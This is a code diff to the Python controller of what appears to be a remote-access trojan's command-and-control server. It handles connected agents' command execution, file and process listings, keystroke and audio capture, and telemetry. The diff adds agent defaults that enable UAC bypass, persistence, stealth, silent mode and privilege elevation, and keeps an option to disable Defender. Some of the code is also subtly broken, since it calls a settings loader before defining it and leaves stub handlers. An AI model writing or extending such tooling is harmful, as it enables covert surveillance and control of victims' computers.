@@ -1,10 +1,10 @@
 #final controller
-from gevent import monkey as gevent_monkey
-gevent_monkey.patch_all()
+# Use standard threading (avoids eventlet/gevent requirements on Render)
 
 from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_cors import CORS
+LIMITER_AVAILABLE = False
 from collections import defaultdict
 import datetime
 import time
@@ -15,6 +15,8 @@ import hashlib
 import hmac
 import secrets
 import threading
+import smtplib
+from email.mime.text import MIMEText
 
 # WebRTC imports for SFU functionality
 try:
@@ -66,10 +68,151 @@ allowed_origins = [
     "https://*.onrender.com"
 ]
 
+# Merge in dynamic CORS origins from settings on startup
+try:
+    _loaded = load_settings()
+    for origin in _loaded.get('security', {}).get('frontendOrigins', []) or []:
+        if isinstance(origin, str) and origin not in allowed_origins:
+            allowed_origins.append(origin)
+except Exception as _e:
+    print(f"Warning loading dynamic CORS origins: {_e}")
+
 CORS(app, origins=allowed_origins, 
      supports_credentials=True, allow_headers=["Content-Type", "Authorization", "X-Requested-With"])
 
-socketio = SocketIO(app, async_mode='gevent', cors_allowed_origins=allowed_origins)
+# Use eventlet (matches Procfile start command) or auto-detect if eventlet is available
+socketio = SocketIO(app, async_mode='threading', cors_allowed_origins=allowed_origins)
+
+# Optional rate limiting (disabled in this revision)
+
+# -----------------------------
+# Settings persistence (JSON)
+# -----------------------------
+SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))
+
+DEFAULT_SETTINGS = {
+    'server': {
+        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
+        'serverPort': Config.PORT,
+        'sslEnabled': False,
+        'maxAgents': 100,
+        'heartbeatInterval': 30,
+        'commandTimeout': 30,
+        'autoReconnect': True,
+        'backupUrl': ''
+    },
+    'authentication': {
+        # Do NOT persist plaintext in production; kept here for parity with UI. Prefer env ADMIN_PASSWORD.
+        'operatorPassword': '',
+        'sessionTimeout': 30,
+        'maxLoginAttempts': 3,
+        'requireTwoFactor': False,
+        'apiKeyEnabled': True,
+        'apiKey': ''
+    },
+    'email': {
+        'enabled': False,
+        'smtpServer': 'smtp.gmail.com',
+        'smtpPort': 587,
+        'username': '',
+        'password': '',
+        'recipient': '',
+        'enableTLS': True,
+        'notifyAgentOnline': True,
+        'notifyAgentOffline': True,
+        'notifyCommandFailure': True,
+        'notifySecurityAlert': True
+    },
+    'agent': {
+        'defaultPersistence': True,
+        'enableUACBypass': True,
+        'enableDefenderDisable': False,
+        'enableAdvancedPersistence': True,
+        'silentMode': True,
+        'quickStartup': False,
+        'enableStealth': True,
+        'autoElevatePrivileges': True
+    },
+    'webrtc': {
+        'enabled': True,
+        'iceServers': [
+            'stun:stun.l.google.com:19302',
+            'stun:stun1.l.google.com:19302'
+        ],
+        'maxBitrate': 5000000,
+        'adaptiveBitrate': True,
+        'frameDropping': True,
+        'qualityLevel': 'auto',
+        'monitoringEnabled': True
+    },
+    'security': {
+        'encryptCommunication': True,
+        'validateCertificates': False,
+        'allowSelfSigned': True,
+        'rateLimitEnabled': True,
+        'rateLimitRequests': 100,
+        'rateLimitWindow': 60,
+        # Allow configuring additional CORS origins from UI
+        'frontendOrigins': []
+    }
+}
+
+def _deep_update(original: dict, updates: dict) -> dict:
+    for key, value in updates.items():
+        if isinstance(value, dict) and isinstance(original.get(key), dict):
+            _deep_update(original[key], value)
+        else:
+            original[key] = value
+    return original
+
+def load_settings() -> dict:
+    try:
+        if os.path.exists(SETTINGS_FILE_PATH):
+            with open(SETTINGS_FILE_PATH, 'r') as f:
+                data = json.load(f)
+            # Merge with defaults to ensure missing keys are present
+            merged = json.loads(json.dumps(DEFAULT_SETTINGS))
+            return _deep_update(merged, data)
+    except Exception as e:
+        print(f"Failed to load settings.json: {e}")
+    return json.loads(json.dumps(DEFAULT_SETTINGS))
+
+def save_settings(data: dict) -> bool:
+    try:
+        with open(SETTINGS_FILE_PATH, 'w') as f:
+            json.dump(data, f, indent=2)
+        return True
+    except Exception as e:
+        print(f"Failed to save settings.json: {e}")
+        return False
+
+def send_email_notification(subject: str, body: str) -> bool:
+    try:
+        cfg = load_settings().get('email', {})
+        if not cfg.get('enabled'):
+            return False
+        smtp_server = cfg.get('smtpServer')
+        smtp_port = int(cfg.get('smtpPort') or 587)
+        username = cfg.get('username')
+        password = cfg.get('password')
+        recipient = cfg.get('recipient')
+        if not all([smtp_server, smtp_port, username, password, recipient]):
+            print("Email settings incomplete; skipping notification")
+            return False
+        msg = MIMEText(body)
+        msg['Subject'] = subject
+        msg['From'] = username
+        msg['To'] = recipient
+        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
+        if cfg.get('enableTLS', True):
+            server.starttls()
+        server.login(username, password)
+        server.sendmail(username, [recipient], msg.as_string())
+        server.quit()
+        return True
+    except Exception as e:
+        print(f"Email notification failed: {e}")
+        return False
 
 # WebRTC Configuration
 WEBRTC_CONFIG = {
@@ -1470,7 +1613,7 @@ DASHBOARD_HTML = r'''
             <div class="overview-section">
               <h4>Agent Statistics</h4>
               <div id="agent-stats-display" class="info-display">
-                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">39</span></div>
+                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">0</span></div>
                 <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
                 <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
                 <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
@@ -2350,6 +2493,9 @@ def execute_bulk_action():
         'successful': len([r for r in results if r['status'] == 'sent'])
     })
 
+if LIMITER_AVAILABLE:
+    pass
+
 # Search and Filter API
 @app.route('/api/agents/search', methods=['GET'])
 @require_auth
@@ -2410,76 +2556,85 @@ def search_agents():
 @app.route('/api/settings', methods=['GET'])
 @require_auth
 def get_settings():
-    """Get current system settings"""
-    settings = {
-        'server': {
-            'host': Config.HOST,
-            'port': Config.PORT,
-            'session_timeout': Config.SESSION_TIMEOUT,
-            'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
-            'login_timeout': Config.LOGIN_TIMEOUT
-        },
-        'security': {
-            'salt_length': Config.SALT_LENGTH,
-            'hash_iterations': Config.HASH_ITERATIONS
-        },
-        'webrtc': {
-            'enabled': WEBRTC_CONFIG['enabled'],
-            'ice_servers': WEBRTC_CONFIG['ice_servers'],
-            'quality_levels': WEBRTC_CONFIG['quality_levels'],
-            'performance_tuning': WEBRTC_CONFIG['performance_tuning']
-        },
-        'monitoring': {
-            'connection_quality_metrics': WEBRTC_CONFIG['monitoring']['connection_quality_metrics'],
-            'automatic_reconnection': WEBRTC_CONFIG['monitoring']['automatic_reconnection'],
-            'stats_interval': WEBRTC_CONFIG['monitoring']['stats_interval']
-        }
-    }
-    
-    return jsonify(settings)
+    """Get current system settings (merged with defaults)."""
+    current = load_settings()
+    # Redact sensitive values
+    safe = json.loads(json.dumps(current))
+    try:
+        if 'authentication' in safe:
+            # Do not return admin password; apiKey can be returned if enabled
+            if 'adminPassword' in safe['authentication']:
+                safe['authentication']['adminPassword'] = ''
+            # Mask API key partially
+            api = safe['authentication'].get('apiKey')
+            if api:
+                safe['authentication']['apiKey'] = api[:4] + "***" + api[-4:]
+        if 'email' in safe and 'password' in safe['email']:
+            safe['email']['password'] = ''
+    except Exception as e:
+        print(f"Warning redacting settings: {e}")
+    return jsonify(safe)
+
+if LIMITER_AVAILABLE:
+    pass
 
 @app.route('/api/settings', methods=['POST'])
 @require_auth
 def update_settings():
-    """Update system settings"""
+    """Update system settings and persist to settings.json. Some changes may need restart."""
     if not request.is_json:
         return jsonify({'error': 'JSON payload required'}), 400
-    
-    settings = request.json
-    updated_settings = []
-    
-    # Update WebRTC settings if provided
-    if 'webrtc' in settings:
-        webrtc_settings = settings['webrtc']
-        if 'quality_levels' in webrtc_settings:
-            WEBRTC_CONFIG['quality_levels'].update(webrtc_settings['quality_levels'])
-            updated_settings.append('webrtc.quality_levels')
-        
-        if 'performance_tuning' in webrtc_settings:
-            WEBRTC_CONFIG['performance_tuning'].update(webrtc_settings['performance_tuning'])
-            updated_settings.append('webrtc.performance_tuning')
-        
-        if 'monitoring' in webrtc_settings:
-            WEBRTC_CONFIG['monitoring'].update(webrtc_settings['monitoring'])
-            updated_settings.append('webrtc.monitoring')
-    
-    # Note: Some settings like server config require restart to take effect
-    return jsonify({
-        'success': True,
-        'updated_settings': updated_settings,
-        'message': 'Settings updated successfully. Some changes may require restart.'
-    })
+    incoming = request.json
+    current = load_settings()
+    updated = _deep_update(current, incoming)
+    if not save_settings(updated):
+        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500
+
+    # Apply a subset live where safe (e.g., WebRTC toggles)
+    try:
+        if 'webrtc' in incoming:
+            webrtc = incoming['webrtc']
+            if 'enabled' in webrtc:
+                WEBRTC_CONFIG['enabled'] = bool(webrtc['enabled'])
+            if 'iceServers' in webrtc:
+                WEBRTC_CONFIG['ice_servers'] = webrtc['iceServers']
+    except Exception as e:
+        print(f"Warning applying live settings: {e}")
+
+    # Determine if restart is required for certain keys
+    restart_required = False
+    critical_paths = [
+        ('server', 'serverPort'),
+        ('server', 'sslEnabled'),
+        ('security', 'frontendOrigins')
+    ]
+    for sect, key in critical_paths:
+        if sect in incoming and key in incoming.get(sect, {}):
+            restart_required = True
+            break
+    # Notify all connected agents of new config
+    try:
+        for _agent_id, _data in AGENTS_DATA.items():
+            if _data.get('sid'):
+                _emit_agent_config(_agent_id)
+    except Exception:
+        pass
+    return jsonify({'success': True, 'message': 'Settings saved.', 'restart_required': restart_required})
+
+if LIMITER_AVAILABLE:
+    pass
 
 @app.route('/api/settings/reset', methods=['POST'])
 @require_auth
 def reset_settings():
     """Reset settings to default values"""
-    # This would reset WEBRTC_CONFIG to defaults
-    # For now, just return success
-    return jsonify({
-        'success': True,
-        'message': 'Settings reset to defaults'
-    })
+    defaults = json.loads(json.dumps(DEFAULT_SETTINGS))
+    if not save_settings(defaults):
+        return jsonify({'success': False, 'message': 'Failed to reset settings'}), 500
+    # Apply a safe subset immediately
+    WEBRTC_CONFIG['enabled'] = defaults['webrtc']['enabled']
+    WEBRTC_CONFIG['ice_servers'] = defaults['webrtc']['iceServers']
+    return jsonify({'success': True, 'message': 'Settings reset to defaults'})
 
 # System Information API
 @app.route('/api/system/info', methods=['GET'])
@@ -2589,6 +2744,9 @@ def handle_operator_connect():
     emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
     print("Operator dashboard connected.")
 
+def _emit_agent_config(agent_id: str):
+    return
+
 @socketio.on('agent_connect')
 def handle_agent_connect(data):
     """When an agent connects and registers itself."""
@@ -2624,6 +2782,7 @@ def handle_agent_connect(data):
         'status': 'success'
     }, room='operators', broadcast=True)
     print(f"Agent {agent_id} connected with SID {request.sid}")
+    pass
 
 @socketio.on('execute_command')
 def handle_execute_command(data):
@@ -2638,6 +2797,26 @@ def handle_execute_command(data):
     else:
         emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
 
+@socketio.on('process_list')
+def handle_process_list(data):
+    """Agent sends structured process list; relay to operators."""
+    agent_id = data.get('agent_id')
+    processes = data.get('processes', [])
+    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)
+
+@socketio.on('file_list')
+def handle_file_list(data):
+    """Agent sends structured directory listing; relay to operators."""
+    agent_id = data.get('agent_id')
+    path = data.get('path', '/')
+    files = data.get('files', [])
+    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators', broadcast=True)
+
+@socketio.on('file_op_result')
+def handle_file_op_result(data):
+    """Relay file operation result to operators."""
+    emit('file_op_result', data, room='operators', broadcast=True)
+
 @socketio.on('command_output')
 def handle_command_output(data):
     """Agent sends back the result of a command (legacy handler)."""
@@ -2647,6 +2826,12 @@ def handle_command_output(data):
     # Forward the output to all operator dashboards
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
+
+@socketio.on('agent_heartbeat')
+def handle_agent_heartbeat(data):
+    agent_id = data.get('agent_id')
+    if agent_id in AGENTS_DATA:
+        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
 
 @socketio.on('live_key_press')
 def handle_live_key_press(data):
@@ -2830,6 +3015,16 @@ def handle_audio_frame(data):
     frame = data.get('frame')
     if agent_id and frame:
         AUDIO_FRAMES_OPUS[agent_id] = frame
+
+@socketio.on('agent_telemetry')
+def handle_agent_telemetry(data):
+    """Telemetry from agent; update AGENTS_DATA and relay summary to operators."""
+    agent_id = data.get('agent_id')
+    if agent_id in AGENTS_DATA:
+        AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
+        AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
+        AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
+        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
 
 # --- WebRTC Socket.IO Event Handlers ---
 
